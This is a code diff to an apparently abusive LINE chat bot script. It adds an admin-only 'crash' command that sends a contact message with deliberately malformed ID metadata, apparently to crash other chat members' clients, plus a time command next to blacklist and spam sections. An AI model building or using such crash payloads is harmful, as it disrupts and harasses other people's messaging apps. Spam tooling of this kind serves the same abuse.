@@ -1394,6 +1394,16 @@ def bot(op):
                                 ki.sendText(msg.to,"There's no target in blacklist.")
            #----------------Fungsi Unbanned User Target Finish-----------------------#
            
+            elif msg.text.lower() == "crash":
+              if msg.from_ in admin:
+                msg.contentType = 13
+                msg.contentMetadata = {'mid': "c33b66e4b7709e54a6fe6eced6e57c157',"}
+                cl.sendMessage(msg)
+								
+            elif "Time" in msg.text:
+              if msg.from_ in admin:
+                  cl.sendText(msg.to,datetime.today().strftime('%H:%M:%S'))
+
         #-------------Fungsi Spam Start---------------------#
             elif msg.text in ["Up","up","Up Chat","Up chat","up chat","Upchat","upchat"]:
                 cl.sendText(msg.to,"􀔃􀆶squared up!􏿿")
